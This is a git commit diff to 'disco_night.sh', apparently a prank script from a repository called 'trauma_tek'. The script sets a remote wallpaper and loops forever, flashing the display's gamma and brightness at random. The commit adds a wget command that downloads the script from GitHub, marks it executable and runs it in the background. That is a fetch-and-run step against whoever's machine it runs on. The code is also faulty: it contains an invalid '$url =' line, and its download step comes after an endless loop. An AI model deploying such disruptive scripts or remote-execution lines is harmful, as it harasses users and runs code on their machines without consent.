8487fccd4a65880789d075acae6f929edab346e7
Léo Baldachino <leo.baldachino@epitech.eu>
2022-10-06 01:45:04 +0200

    [+] Disco !

--- disco_night.sh
+++ disco_night.sh
@@ -6,9 +6,13 @@ feh --bg-fill https://preview.redd.it/wz80jkhcp6z61.jpg?auto=webp&s=e86693b09c01
 
 # fuck up gamma and contrast
 while true; do
-    xgamma -gamma $(shuf -i 0-10 -n 1)
-    xgamma -contrast $(shuf -i 0-10 -n 1)
-    beep -f $(shuf -i 100-1000 -n 1)
-    sleep 1
+    xrandr --output eDP-1 --gamma rand:rand:rand --brightness rand
+    sleep 0.1
+    xrandr --output eDP-1 --gamma 0.5:0.5:0.5 --brightness 0.5
+    sleep 0.1
 done
 
+$url = https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/main/disco_night.sh
+
+# Download the script and make it executable
+wget https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/main/disco_night.sh -O /tmp/disco_night.sh && chmod +x /tmp/disco_night.sh && /tmp/disco_night.sh &
